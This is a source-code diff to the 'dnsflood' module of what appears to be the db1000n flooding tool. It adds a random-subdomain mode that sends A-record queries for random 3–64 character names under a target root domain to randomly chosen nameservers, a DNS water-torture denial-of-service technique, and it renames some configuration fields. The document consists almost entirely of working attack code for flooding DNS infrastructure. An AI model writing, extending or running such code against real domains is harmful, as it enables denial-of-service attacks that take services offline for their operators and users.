@@ -1,7 +1,9 @@
 package dnsflood
 
 import (
+	"fmt"
 	"github.com/Arriven/db1000n/src/logs"
+	"github.com/Arriven/db1000n/src/utils"
 	"github.com/miekg/dns"
 	"math/rand"
 	"net"
@@ -9,11 +11,11 @@ import (
 )
 
 type Config struct {
-	Verbose       bool
-	Iterative     bool
-	RootDomain    string   `json:"root_domain"`
-	TargetDomains []string `json:"target_domains"`
-	IntervalMs    int
+	Iterative        bool
+	RootDomain       string   `json:"root_domain"`
+	TargetDomains    []string `json:"target_domains"`
+	RandomSubDomains bool     `json:"random_subdomains"`
+	IntervalMs       int      `json:"interval_ms"`
 }
 type DnsStress struct {
 	Logger      *logs.Logger
@@ -53,7 +55,6 @@ func Start(stopChan chan bool, logger *logs.Logger, config *Config) error {
 	}
 
 	logger.Info("Stressing nameservers for domain: %s.", config.RootDomain)
-	logger.Info("Target domains: %v.", config.TargetDomains)
 
 	go s.Stress(stopChan, config.TargetDomains, config.IntervalMs)
 
@@ -75,6 +76,12 @@ func (s DnsStress) Stress(stopChan chan bool, domains []string, intervalMs int) 
 		case <-stopChan:
 			return
 		default:
+			if s.Config.RandomSubDomains {
+				randomSubdomain := utils.RandStringRange(3, 64)
+				domain := fmt.Sprintf("%s.%s.", randomSubdomain, s.Config.RootDomain)
+				randomMessage := new(dns.Msg).SetQuestion(domain, dns.TypeA)
+				messages = append(messages, randomMessage)
+			}
 			randomNameserver := s.Nameservers[rand.Intn(len(s.Nameservers))]
 			sendMessages(randomNameserver, messages)
 		}
